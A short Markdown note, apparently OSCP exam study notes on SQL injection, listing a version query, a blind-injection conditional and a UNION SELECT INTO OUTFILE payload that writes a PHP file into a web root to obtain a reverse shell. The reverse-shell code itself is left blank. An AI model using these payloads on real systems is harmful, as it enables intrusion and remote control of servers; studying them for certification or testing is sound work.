# SQL for OSCP

* select @@version
* select IF\(MID\(x,x,x\) = y,y,y\);
* Getting reverse shell
  * ?id=769 union all select 1,2,3,4,"",6 into OUTFILE 'c:/xampp/htdocs/rev\_shell.php'
  * this is the syntax, now just we need a php reverse shell code on liner.
  * 

